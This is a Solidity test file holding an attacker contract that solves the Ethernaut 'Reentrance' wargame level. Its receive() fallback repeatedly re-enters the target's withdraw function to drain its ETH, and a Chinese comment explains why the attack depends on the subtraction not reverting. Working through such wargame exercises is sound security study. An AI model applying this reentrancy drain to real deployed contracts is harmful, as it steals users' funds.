// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {Reentrance} from "../../src/ethernaut/10_Reentrance/Reentrance.sol";

contract Reentrance_Attacker {
	address player;
	Reentrance coreInst;
	
	uint256 initETHAmount = 0;
	bool isInAttacking = false;
	uint256 attackCounter = 0;
	
	constructor(Reentrance coreInst_) payable {
		player = msg.sender;
		coreInst = coreInst_;
		
		require(msg.value > 0);
		initETHAmount = msg.value;
	}
	
	receive() external payable {
		console.log("address(coreInst).balance", address(coreInst).balance);
		console.log("attackCounter", attackCounter);
		if (isInAttacking && address(coreInst).balance > 0) {
			uint256 amount = (address(coreInst).balance >= initETHAmount) ? initETHAmount : address(coreInst).balance;
			console.log("attack amount", amount);
			console.log("");
			
			attackCounter++;
			coreInst.withdraw(amount);
		}
	}
	
	function doAttack() public {
		coreInst.donate{value: initETHAmount}(address(this));
		isInAttacking = true;
		coreInst.withdraw(initETHAmount);
		
		// 小结：如果在 balances[msg.sender] -= _amount; 溢出回滚，则无法成功
		// 故，重入后得到的`积木回弹`，理解也很重要。
	}
}
